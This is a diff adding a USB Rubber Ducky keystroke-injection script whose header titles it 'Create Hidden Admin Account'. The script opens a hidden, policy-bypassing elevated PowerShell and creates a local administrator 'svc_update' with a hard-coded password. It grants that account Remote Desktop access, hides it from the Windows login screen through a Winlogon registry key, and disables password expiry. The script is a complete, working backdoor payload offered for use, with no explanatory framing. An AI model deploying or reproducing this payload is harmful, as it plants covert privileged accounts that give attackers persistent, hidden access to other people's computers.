@@ -1,0 +1,13 @@
+REM ============================================
+REM  FU PERSON | Create Hidden Admin Account
+REM  FLLC - by PERSON FU
+REM  Time: ~8 seconds | Stealth: MEDIUM
+REM  Creates hidden local admin, hides from login
+REM  Requires: Admin
+REM ============================================
+DELAY 500
+GUI r
+DELAY 400
+STRING powershell -w hidden -ep bypass -c "Start-Process powershell -Verb RunAs -WindowStyle Hidden -ArgumentList '-ep bypass -c \"$u=\\\"svc_update\\\";$p=\\\"FuP3rs0n!2026\\\";net user $u $p /add /y;net localgroup Administrators $u /add;net localgroup \\\"Remote Desktop Users\\\" $u /add;reg add \\\"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList\\\" /v $u /t REG_DWORD /d 0 /f;wmic useraccount where name=$u set PasswordExpires=False;\\\"Account $u created and hidden\\\"|Out-File ([Environment]::GetFolderPath(\\\"Desktop\\\")+\\\"\\.svc_done\\\")\"'"
+ENTER
+DELAY 500
